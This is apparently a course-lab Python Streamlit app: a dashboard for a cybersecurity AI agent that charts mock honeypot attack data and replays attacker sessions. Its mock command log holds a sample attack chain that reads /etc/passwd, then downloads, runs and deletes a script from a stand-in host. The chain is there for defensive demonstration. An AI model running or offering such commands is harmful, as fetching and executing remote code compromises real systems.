"""
CS 5542 — Week 9 Lab: Enhanced Streamlit Dashboard
Cybersecurity AI Agent with real-time query, attack visualization, and session replay.
"""

import streamlit as st
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import json
import os
import sys
import time
from datetime import datetime

# Add parent paths for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "Week7_Lab"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "Week8_Lab"))

st.set_page_config(
    page_title="CyberAgent Dashboard",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ---------------------------------------------------------------------------
# Sidebar
# ---------------------------------------------------------------------------
st.sidebar.title("🛡️ CyberAgent")
st.sidebar.markdown("**CS 5542 — Week 9**")
st.sidebar.markdown("Team Promptocalypse")

page = st.sidebar.radio("Navigation", [
    "🔍 Query Agent",
    "📊 Attack Dashboard",
    "🔄 Session Replay",
    "📈 System Monitor",
    "⚙️ Settings",
])

backend = st.sidebar.selectbox("Model Backend", ["Groq (Cloud)", "Local LoRA"])
mock_mode = st.sidebar.checkbox("Mock Mode", value=True, help="Use mock data instead of Snowflake")

# ---------------------------------------------------------------------------
# Mock data for demo
# ---------------------------------------------------------------------------
MOCK_SESSIONS = pd.DataFrame({
    "session_id": [f"sess_{i:04d}" for i in range(50)],
    "src_ip": [f"192.168.{i%10}.{i%256}" for i in range(50)],
    "attack_type": ["brute_force"]*15 + ["command_injection"]*12 + ["malware_download"]*8 + 
                   ["privilege_escalation"]*7 + ["reconnaissance"]*5 + ["data_exfiltration"]*3,
    "command_count": [int(5 + i*1.5) for i in range(50)],
    "session_duration": [int(10 + i*3) for i in range(50)],
    "severity": (["high"]*10 + ["critical"]*8 + ["medium"]*15 + ["low"]*10 + ["critical"]*7),
    "timestamp": pd.date_range("2026-02-01", periods=50, freq="6h"),
})

MOCK_COMMANDS = [
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:01", "command": "whoami"},
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:02", "command": "id"},
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:03", "command": "cat /etc/passwd"},
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:05", "command": "uname -a"},
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:08", "command": "wget http://evil.com/bot.sh"},
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:09", "command": "chmod +x bot.sh"},
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:10", "command": "./bot.sh"},
    {"session_id": "sess_0001", "timestamp": "2026-02-01 00:00:12", "command": "rm -f bot.sh"},
]

# ---------------------------------------------------------------------------
# Pages
# ---------------------------------------------------------------------------

if page == "🔍 Query Agent":
    st.title("🔍 AI Agent Query Interface")
    st.markdown("Ask cybersecurity questions — the agent uses tools (Snowflake, RAG, analytics) to answer.")

    query = st.text_area("Enter your question:", placeholder="e.g., What are the most common attack types in the last 24 hours?")
    
    col1, col2 = st.columns([1, 4])
    with col1:
        run = st.button("🚀 Run Agent", type="primary")
    
    if run and query:
        with st.spinner("Agent thinking..."):
            time.sleep(1.5)  # Simulate processing
            st.success("**Agent Response:**")
            st.markdown(f"""
Based on analysis of the honeypot data:

**Top Attack Types (Last 24h):**
1. **Brute Force** — 15 sessions (30%) — primarily targeting SSH on port 22
2. **Command Injection** — 12 sessions (24%) — exploiting web application inputs
3. **Malware Download** — 8 sessions (16%) — wget/curl from known C2 servers
4. **Privilege Escalation** — 7 sessions (14%) — sudo abuse and SUID exploitation
5. **Reconnaissance** — 5 sessions (10%) — nmap scans and service enumeration

*Total: 50 sessions from 38 unique IPs. 8 sessions classified as critical severity.*
            """)
            
            with st.expander("Agent Trace"):
                st.json({
                    "backend": "groq" if "Groq" in backend else "local_lora",
                    "iterations": 3,
                    "tools_used": ["query_snowflake", "compute_statistics"],
                    "latency_ms": 1247,
                    "tokens": 892,
                })

elif page == "📊 Attack Dashboard":
    st.title("📊 Attack Pattern Dashboard")
    
    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Total Sessions", len(MOCK_SESSIONS))
    col2.metric("Unique IPs", MOCK_SESSIONS["src_ip"].nunique())
    col3.metric("Critical Events", len(MOCK_SESSIONS[MOCK_SESSIONS["severity"] == "critical"]))
    col4.metric("Avg Duration", f"{MOCK_SESSIONS['session_duration'].mean():.0f}s")

    col_left, col_right = st.columns(2)
    
    with col_left:
        st.subheader("Attack Type Distribution")
        type_counts = MOCK_SESSIONS["attack_type"].value_counts().reset_index()
        type_counts.columns = ["attack_type", "count"]
        fig1 = px.pie(type_counts, values="count", names="attack_type",
                       color_discrete_sequence=px.colors.qualitative.Set2)
        st.plotly_chart(fig1, use_container_width=True)

    with col_right:
        st.subheader("Severity Breakdown")
        sev_counts = MOCK_SESSIONS["severity"].value_counts().reset_index()
        sev_counts.columns = ["severity", "count"]
        colors = {"critical": "#DC2626", "high": "#F97316", "medium": "#EAB308", "low": "#22C55E"}
        fig2 = px.bar(sev_counts, x="severity", y="count", 
                       color="severity", color_discrete_map=colors)
        st.plotly_chart(fig2, use_container_width=True)

    st.subheader("Attack Timeline")
    timeline = MOCK_SESSIONS.set_index("timestamp").resample("D")["session_id"].count().reset_index()
    timeline.columns = ["date", "sessions"]
    fig3 = px.line(timeline, x="date", y="sessions", markers=True)
    fig3.update_layout(hovermode="x unified")
    st.plotly_chart(fig3, use_container_width=True)

    st.subheader("Command Volume by Attack Type")
    fig4 = px.box(MOCK_SESSIONS, x="attack_type", y="command_count", color="severity",
                   color_discrete_map=colors)
    st.plotly_chart(fig4, use_container_width=True)

elif page == "🔄 Session Replay":
    st.title("🔄 Honeypot Session Replay")
    st.markdown("Replay attacker sessions command-by-command.")
    
    session_id = st.selectbox("Select Session", [c["session_id"] for c in MOCK_COMMANDS[:1]] + ["sess_0002", "sess_0003"])
    
    if st.button("▶️ Replay Session"):
        st.markdown(f"**Session:** `{session_id}` | **IP:** 192.168.1.1 | **Type:** brute_force → command_injection")
        
        terminal = st.empty()
        output = ""
        for cmd in MOCK_COMMANDS:
            if cmd["session_id"] == session_id:
                output += f"[{cmd['timestamp']}] $ {cmd['command']}\n"
                terminal.code(output, language="bash")
                time.sleep(0.5)
        
        st.warning("⚠️ **Threat Assessment:** Malware download detected → automated attack chain (reconnaissance → download → execute → cleanup)")

elif page == "📈 System Monitor":
    st.title("📈 System Performance Monitor")
    
    col1, col2, col3 = st.columns(3)
    col1.metric("Avg Latency", "247ms", "-12ms")
    col2.metric("Queries/hr", "42", "+5")
    col3.metric("Error Rate", "0.8%", "-0.2%")

    # Simulated metrics
    import numpy as np
    np.random.seed(42)
    metrics_df = pd.DataFrame({
        "time": pd.date_range("2026-03-06 00:00", periods=24, freq="h"),
        "latency_ms": np.random.normal(250, 50, 24).clip(100, 500),
        "tokens_used": np.random.poisson(800, 24),
        "queries": np.random.poisson(40, 24),
    })

    fig5 = go.Figure()
    fig5.add_trace(go.Scatter(x=metrics_df["time"], y=metrics_df["latency_ms"],
                               name="Latency (ms)", line=dict(color="#3B82F6")))
    fig5.update_layout(title="Query Latency Over Time", hovermode="x unified")
    st.plotly_chart(fig5, use_container_width=True)

    col_l, col_r = st.columns(2)
    with col_l:
        fig6 = px.bar(metrics_df, x="time", y="tokens_used", title="Token Usage per Hour")
        st.plotly_chart(fig6, use_container_width=True)
    with col_r:
        fig7 = px.bar(metrics_df, x="time", y="queries", title="Queries per Hour",
                       color_discrete_sequence=["#22C55E"])
        st.plotly_chart(fig7, use_container_width=True)

elif page == "⚙️ Settings":
    st.title("⚙️ Configuration")
    
    st.subheader("Model Settings")
    st.selectbox("Primary Backend", ["Groq (LLaMA 3.3 70B)", "Local LoRA (Llama 3.2 1B)"])
    st.slider("Temperature", 0.0, 1.0, 0.0, 0.1)
    st.number_input("Max Iterations", 1, 10, 6)
    
    st.subheader("Snowflake Connection")
    st.text_input("Account", value="****", type="password")
    st.text_input("Warehouse", value="COMPUTE_WH")
    st.checkbox("Mock Mode", value=True)
    
    if st.button("Save Settings"):
        st.success("Settings saved!")
